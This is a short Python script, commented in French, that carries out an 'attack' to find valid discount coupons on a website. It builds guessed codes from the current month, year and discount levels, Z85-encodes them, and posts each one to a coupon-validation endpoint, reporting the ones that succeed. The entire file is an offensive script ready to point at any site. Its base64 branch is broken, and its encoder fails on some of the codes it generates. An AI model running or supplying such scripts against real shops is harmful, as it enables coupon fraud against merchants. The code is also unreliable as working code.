import requests
from datetime import datetime

def run_generic_coupon_attack(base_url, encoding="z85"):
    """
    Exécute une attaque générique sur un site web pour découvrir des coupons valides.
    """
    def generate_payloads():
        now = datetime.now()
        month = now.strftime('%b').upper()
        year = now.strftime('%y')
        discount_values = [10, 20, 50, 80, 100]
        return [f"{month}{year}-{discount}" for discount in discount_values]

    def z85_encode(data):
        z85_chars = (
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
        )
        if len(data) % 4 != 0:
            raise ValueError("Data length must be a multiple of 4.")

        encoded = ""
        for i in range(0, len(data), 4):
            value = (data[i] << 24) + (data[i + 1] << 16) + (data[i + 2] << 8) + data[i + 3]
            block = ""
            for _ in range(5):
                block = z85_chars[value % 85] + block
                value //= 85
            encoded += block
        return encoded

    payloads = generate_payloads()
    valid_coupons = []
    endpoint = f"{base_url}/rest/coupon/validate"

    for payload in payloads:
        try:
            if encoding == "z85":
                encoded_payload = z85_encode(payload.encode())
            elif encoding == "base64":
                encoded_payload = payload.encode().decode("base64")
            else:
                encoded_payload = payload

            response = requests.post(endpoint, json={"couponCode": encoded_payload})
            if response.status_code == 200:
                valid_coupons.append(encoded_payload)
                print(f"[SUCCESS] Valid coupon: {encoded_payload}")
            else:
                print(f"[INFO] Invalid coupon: {encoded_payload}, Status: {response.status_code}")
        except Exception as e:
            print(f"[ERROR] Failed to test payload {payload}: {str(e)}")
    
    return valid_coupons
